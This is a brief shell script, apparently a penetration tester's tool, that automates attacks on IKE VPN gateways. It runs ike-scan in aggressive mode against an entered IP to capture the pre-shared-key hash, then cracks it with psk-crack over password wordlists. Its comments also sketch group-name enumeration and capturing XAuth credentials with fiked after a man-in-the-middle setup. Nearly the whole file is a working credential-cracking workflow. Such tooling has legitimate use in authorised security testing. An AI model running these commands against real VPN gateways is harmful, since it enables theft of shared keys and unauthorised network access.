#!/bin/sh
#  set -x # Echo on for taking screenshots in order to show commands used to confirm the finding
#  set +x # Echo off until it's needed
#  set is used in a subshell so only the actual ike-scan and psk-cap commands are displayed in std out
#
# Name: ikeee.sh
# Auth: Frank Cass
# Date: 20151218
# Desc: Automated IKE Aggressive Mode Scanner / Cracker
#
# TODO: Implement Fingerprinting the VPN gateway for guessing implementation
# 	ike-scan -M --showbackoff
# TODO: Using Ike-force to enumerate the ID groupname
# 	./ikeforce.py $ip -e -w wordlists/groupnames.dic -s 1
# TODO: Ike-scan can use the --vendor switch to add the VID payload to outbound packets
# TODO: Implement using fiked after successful MitM setup to capture XAuth credentials
# 	Given below is a simple example of fiked. The -g switch specifies the IP address of the gateway, captured data is written to a file with the -l switch, -d is used to run it in daemon mode, and -k is for “group id: shared key” representation
# 	fiked -g 192.168.1.50 -k testgroup:secretkey -l output.txt -d
# TODO: Ability to enter group ID if known before performing any scans (Note: will be applied to all IPs if scripted)
#
###

echo "[*] Please enter an IP"; read ip
echo "[*] Performing ike-scan: "; ( set -x; ike-scan --aggressive --multiline --pskcrack -id=vpn $ip > ike_$ip.cap ) # Subshell to prevent set +x from being printed by toggling echo on/off mid script
echo "[*] Scan Complete. Saved to:" ike_$ip.cap # No error checking if it failed, just continues.
echo "[*] Formatting output to be used for psk-crack..."; cat ike_$ip.cap | grep -i "IKE PSK" -A 10 | grep -v "Ending" | grep -v "IKE" > ike_$ip.psk
echo "[*] PSK saved to:" ike_$ip.psk
echo "[*] Starting psk-crack"; ( set -x; psk-crack -v -d /usr/share/wordlists/passwords* ike_$ip.psk ); echo "[*] Done" # Another subshell to prevent set +x from being printed through echo toggling


